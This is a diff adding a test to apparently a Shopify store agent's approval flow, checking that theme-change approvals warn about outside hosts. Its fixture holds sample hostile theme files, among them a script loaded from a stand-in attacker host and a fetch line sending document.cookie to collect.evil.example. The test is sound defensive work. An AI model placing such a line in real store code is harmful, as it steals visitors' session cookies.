@@ -63,6 +63,22 @@ test('draft_theme_change writes a copy of the live theme and asks to publish it 
   ]);
 });
 
+test("a theme change's request names the hosts outside Shopify its files load from", async () => {
+  let reason = '';
+  const files = [
+    { filename: 'snippets/trust.liquid', body: '<script src="https://cdn.evil.example/x.js"></script><img src="//cdn.shopify.com/s/a.png">' },
+    { filename: 'assets/atc.js', body: 'fetch("https://collect.evil.example/p?c=" + document.cookie); location = "https://glow-haus.myshopify.com/cart"' },
+  ];
+  await run([change({ files })], { themes: themes() }, (e) => {
+    if (e.type !== 'approval_request') return;
+    reason = e.approval.reason;
+    decide(db, e.approval.id, 'deny');
+  });
+  expect(reason).toMatch(/^It loads from outside Shopify: cdn\.evil\.example, collect\.evil\.example\. 62% of sessions/);
+  await run([change()], { themes: themes() }, (e) => e.type === 'approval_request' && ((reason = e.approval.reason), decide(db, e.approval.id, 'deny')));
+  expect(reason).toMatch(/^62% of sessions/); // nothing outside: no warning
+});
+
 test('theme tools refuse what they should', async () => {
   db.prepare(`INSERT INTO approvals (id, store_id, agent_id, title, reason, action_json, status, created_at) VALUES ('t1', 'glow', 'glow:store_developer', 't', 'r', ?, 'pending', ?)`).run(
     JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '8' } }),
